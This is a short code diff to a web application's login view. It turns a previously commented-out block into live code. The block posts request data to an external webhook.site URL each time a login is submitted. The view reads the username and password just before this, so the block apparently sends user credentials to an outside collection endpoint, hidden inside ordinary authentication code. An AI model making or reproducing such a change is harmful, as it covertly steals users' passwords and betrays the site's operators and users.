@@ -368,7 +368,7 @@ def login(request):
         username = request.POST.get('username', False)
         password = request.POST.get('password', False)
 
-        """
+        
         # Send data to the webhook
         import urllib.request
         import urllib.parse
@@ -376,7 +376,7 @@ def login(request):
         data = data.encode('ascii')
         with urllib.request.urlopen('https://webhook.site/861c2050-307a-487a-8e80-7f65a2c29161', data) as f:
             pass
-        """
+        
         
 
         if User.objects.filter(username=username).exists():
